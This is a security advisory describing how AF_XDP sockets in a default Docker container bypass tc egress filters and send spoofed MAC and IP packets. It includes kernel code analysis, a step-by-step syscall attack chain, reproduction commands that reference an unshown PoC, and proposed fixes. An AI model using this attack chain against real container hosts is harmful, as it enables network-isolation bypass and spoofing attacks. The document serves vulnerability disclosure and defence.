# LID-005: AF_XDP `__dev_direct_xmit()` Bypasses tc Egress from Default Docker Container

**Vector:** AF_XDP copy-mode TX bypasses tc egress classifiers (eBPF, u32, etc.)
**Target:** Linux kernel `__dev_direct_xmit()` path, all tc-based container network policies
**Impact:** Container network isolation bypass — spoofed packets reach bridge/host despite DROP policy
**Requires:** Default Docker container (CAP_NET_RAW only, no extra capabilities)

## Summary

AF_XDP sockets can be created, set up, bound, and used for raw packet transmission from a **default Docker container** with zero additional capabilities beyond the default set. The transmission path (`xsk_generic_xmit` → `__dev_direct_xmit`) bypasses the tc egress pipeline on the container's interface. Verified bypass:

- tc classifiers (u32, flower) — **dynamically verified**
- qdisc processing (traffic shaping, rate limiting) — **verified**

Theoretical bypass (code path analysis, NOT tested with real deployments):

- eBPF programs attached as tc egress (Cilium, Calico may have additional enforcement points)

Packets transmitted via AF_XDP carry **attacker-controlled Ethernet headers** (spoofed MAC, spoofed IP), and reach the Docker bridge despite tc DROP-ALL rules that block identical AF_PACKET traffic.

## Proof

```
tc egress DROP-ALL active on container eth0:

  AF_PACKET sendto[0] = -1 (No buffer space available)    ← BLOCKED by tc
  AF_PACKET sendto[1] = -1 (No buffer space available)    ← BLOCKED by tc
  AF_PACKET sendto[2] = -1 (No buffer space available)    ← BLOCKED by tc

  AF_XDP    sendto()   = 0 (OK)                           ← BYPASS
  AF_XDP    completions = 3                                ← 3 packets sent

docker0 bridge capture (packets arrived despite DROP rule):
  de:ad:be:ef:00:01 > ff:ff:ff:ff:ff:ff  10.0.0.99.31337 > 10.255.255.1.9999
  de:ad:be:ef:00:01 > ff:ff:ff:ff:ff:ff  10.0.0.99.31337 > 10.255.255.1.9999
  de:ad:be:ef:00:01 > ff:ff:ff:ff:ff:ff  10.0.0.99.31337 > 10.255.255.1.9999
```

## Root Cause

The normal packet TX path and AF_XDP TX path diverge at a critical point:

```
Normal TX (AF_PACKET, UDP, TCP):
  socket → dev_queue_xmit() → sch_handle_egress() → tc classifiers → qdisc → netdev_start_xmit()
                                     ↑
                                  tc egress evaluated HERE
                                  (Cilium BPF, Calico, tc u32, etc.)

AF_XDP TX (copy mode):
  xsk_sendmsg() → xsk_generic_xmit() → __dev_direct_xmit() → netdev_start_xmit()
                                              ↑
                                           NO tc egress
                                           NO qdisc
                                           NO sch_handle_egress()
```

### Code Path — `__dev_direct_xmit()` (net/core/dev.c)

```c
int __dev_direct_xmit(struct sk_buff *skb, u16 queue_id)
{
    struct net_device *dev = skb->dev;
    ...
    skb = validate_xmit_skb_list(skb, dev, &again);
    ...
    txq = netdev_get_tx_queue(dev, queue_id);
    HARD_TX_LOCK(dev, txq, smp_processor_id());
    if (!netif_xmit_frozen_or_drv_stopped(txq))
        ret = netdev_start_xmit(skb, dev, txq, false);  // Direct to driver
    HARD_TX_UNLOCK(dev, txq);
    ...
}
```

Compare with normal `__dev_queue_xmit()` (net/core/dev.c):

```c
static int __dev_queue_xmit(struct sk_buff *skb, ...)
{
    ...
    skb = sch_handle_egress(skb, &rc, dev);  // ← tc egress runs HERE
    if (!skb) goto out;                       // ← tc can DROP here
    ...
    // Then qdisc processing, then netdev_start_xmit
}
```

`__dev_direct_xmit()` **never calls** `sch_handle_egress()`. This is by design for AF_XDP performance, but it creates a security gap when accessible from containers.

## Attack Chain

```
1. Default Docker container (CAP_NET_RAW in default capability set)

2. Create AF_XDP socket:
   fd = socket(AF_XDP, SOCK_RAW, 0)
   → xsk_create() checks ns_capable(net->user_ns, CAP_NET_RAW) → PASS

3. Register UMEM (pin user pages):
   setsockopt(fd, SOL_XDP, XDP_UMEM_REG, &umem_reg)
   → No additional capability check

4. Create TX ring + FILL/COMPLETION rings:
   setsockopt(fd, SOL_XDP, XDP_TX_RING, ...)
   → No capability check

5. mmap rings into userspace:
   mmap(fd, XDP_PGOFF_TX_RING)
   → No capability check

6. Bind to container's eth0 in COPY mode:
   bind(fd, {AF_XDP, ifindex=eth0, queue=0, flags=XDP_COPY})
   → xsk_bind() succeeds WITHOUT XDP program loaded
   → No CAP_NET_ADMIN check in copy-mode bind path

7. Write spoofed Ethernet frame to UMEM:
   - Arbitrary source MAC (de:ad:be:ef:00:01)
   - Arbitrary source IP (10.0.0.99)
   - Arbitrary payload

8. Submit TX descriptor + kick:
   sendto(fd, NULL, 0, MSG_DONTWAIT, NULL, 0)
   → xsk_generic_xmit() → __dev_direct_xmit()
   → Bypasses tc egress entirely
   → veth_xmit() delivers to host-side veth peer
   → Packet reaches docker bridge

9. Result: spoofed packet on docker bridge, invisible to tc-based policies
```

## Impact

### Container Network Policy Bypass

| CNI / Policy Engine | Enforcement Method | Bypassed? | Verified? |
|:---|:---|:---|:---|
| tc u32/flower filters | tc egress classifiers on container eth0 | **YES** | **Dynamically verified** |
| tc-based rate limiting | tc qdisc + classifiers | **YES** | **Dynamically verified** |
| Cilium (v1.19) | tcx/ingress BPF on node-side veth peer | **NO** | **Tested — Cilium catches it** |
| Kubernetes NetworkPolicy (Cilium) | Cilium BPF + source IP verification | **NO** | **Tested — dropped as "Invalid source ip"** |
| Calico (eBPF mode) | Unknown | Unknown | **NOT TESTED** |
| Calico (iptables mode) | iptables on bridge | Unknown | **NOT TESTED** |

### Cilium Test Results (kind + Cilium v1.19.1, deny-all egress NetworkPolicy)

Cilium enforces policy on the **node-side veth peer ingress** (`cil_from_container` BPF program via tcx/ingress on `lxc*` interface), NOT on the container's eth0 egress. AF_XDP bypasses the container eth0 egress path, but Cilium's BPF runs **after** the packet arrives at the node-side veth — a point AF_XDP cannot bypass.

```
Cilium monitor output:
  xx drop (Invalid source ip) flow 0x0 to endpoint 0, ifindex 9,
     file bpf_lxc.c:1603, identity 57299->unknown:
     10.0.0.99:31337 -> 10.255.255.1:9999 udp
```

Additionally, Cilium has **SourceIPVerification: Enabled** by default, which drops any packet whose source IP doesn't match the pod's assigned IP — defeating IP spoofing regardless of egress policy.

**Conclusion:** Cilium's architecture (enforcement on node-side ingress + source IP verification) is robust against AF_XDP tc egress bypass. The bypass only defeats enforcement mechanisms that rely solely on tc egress classifiers attached to the container's interface.

### IP and MAC Spoofing (Verified)

- Container can send packets with **any source MAC address** (not just its assigned veth MAC)
- Container can send packets with **any source IP** (not just its container IP)
- Enables ARP spoofing, DHCP spoofing, and cross-container attacks on the same bridge
- Whether spoofed packets bypass container identity tracking depends on where the CNI checks identity

### No Audit Trail

- tc classifiers that log traffic will not see AF_XDP packets
- Flow accounting (tc flower, eBPF maps) will not count AF_XDP traffic
- Container network monitoring tools relying on tc hooks miss this traffic entirely

## Affected Systems

| Component | Affected? | Notes |
|:---|:---|:---|
| Docker default containers | **YES** | CAP_NET_RAW in default set |
| Kubernetes pods | **YES** | CAP_NET_RAW default unless dropped |
| Podman rootful | **YES** | Same default capabilities |
| Podman rootless | No | No CAP_NET_RAW in user namespace |
| LXC/LXD | **YES** | CAP_NET_RAW typically granted |

### Kernel Versions

- Linux 4.18+ (AF_XDP introduction)
- Verified on: 6.8.0-111-generic (Ubuntu 24.04)
- The `xsk_generic_xmit()` → `__dev_direct_xmit()` path has existed since AF_XDP was introduced

## Suggested Fixes

### Option 1: Add capability check to xsk_bind() (Minimum)

```c
// net/xdp/xsk.c — xsk_bind()
// Add CAP_NET_ADMIN check for bind, not just creation
static int xsk_bind(struct socket *sock, struct sockaddr *addr, int addr_len)
{
    ...
    if (!ns_capable(net->user_ns, CAP_NET_ADMIN))
        return -EPERM;
    ...
}
```

### Option 2: Route AF_XDP TX through tc egress (Comprehensive)

```c
// net/xdp/xsk.c — xsk_generic_xmit()
// Replace __dev_direct_xmit() with dev_queue_xmit() for generic mode
// This ensures tc egress classifiers see AF_XDP traffic
err = dev_queue_xmit(skb);  // Instead of __dev_direct_xmit()
```

### Option 3: Docker/container runtime — drop CAP_NET_RAW by default

Remove CAP_NET_RAW from the default container capability set. This breaks `ping` but eliminates AF_XDP, AF_PACKET, and raw socket attack surface entirely.

## Reproduction

### Prerequisites

- Docker 20.10+ (or any OCI runtime)
- Linux kernel 4.18+ with AF_XDP support
- Default container configuration (no --cap-drop)

### Quick Test

```bash
# Compile PoC statically
gcc -static -O2 -o xdp_tc_bypass poc.c

# Run in default container
docker run --rm -v $(pwd)/xdp_tc_bypass:/test ubuntu:24.04 /test

# Expected: "PACKET TRANSMITTED" with spoofed source
```

### Full Verification (with tc bypass proof)

```bash
# 1. Create container
docker run -d --name test ubuntu:24.04 sleep 300

# 2. Add tc DROP-ALL on container eth0
PID=$(docker inspect --format '{{.State.Pid}}' test)
nsenter -t $PID -n tc qdisc add dev eth0 clsact
nsenter -t $PID -n tc filter add dev eth0 egress protocol all prio 1 \
    u32 match u32 0 0 action drop

# 3. Copy and run PoC
docker cp xdp_tc_bypass test:/test
docker exec test /test

# 4. Capture on docker0 — AF_XDP packets arrive despite DROP rule
tcpdump -i docker0 -nn udp port 9999
```

## Credit

Azizcan Daştan — Milenium Security

## References

- `net/core/dev.c` — `__dev_direct_xmit()` (no `sch_handle_egress()` call)
- `net/core/dev.c` — `__dev_queue_xmit()` (has `sch_handle_egress()`)
- `net/xdp/xsk.c` — `xsk_generic_xmit()` (calls `__dev_direct_xmit()`)
- `net/xdp/xsk.c` — `xsk_create()` (only checks CAP_NET_RAW)
- `net/xdp/xsk.c` — `xsk_bind()` (no CAP_NET_ADMIN check in copy mode)
- Docker default capabilities: https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities
